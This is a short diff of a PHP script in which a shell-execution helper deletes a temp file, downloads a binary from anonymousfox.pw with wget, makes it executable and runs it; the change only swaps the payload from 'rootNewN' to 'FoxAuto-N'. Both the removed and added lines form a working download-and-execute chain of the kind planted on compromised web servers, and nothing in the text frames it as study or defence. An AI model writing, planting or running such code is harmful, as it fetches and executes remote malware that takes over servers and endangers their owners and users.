@@ -25,8 +25,8 @@ function exe($in) {
         return $out;
 }
 
-exe("rm -rf /tmp/AnonymousFox.bak");
-exe("wget http://anonymousfox.pw/local/wso/rootNewN");
-exe("chmod +x rootNewN");
-exe("./rootNewN 0");
+exe("rm -rf /tmp/FoxAuto");
+exe("wget https://anonymousfox.pw/local/FoxAuto/FoxAuto-N");
+exe("chmod +x FoxAuto-N");
+exe("./FoxAuto-N 0");
 ?>
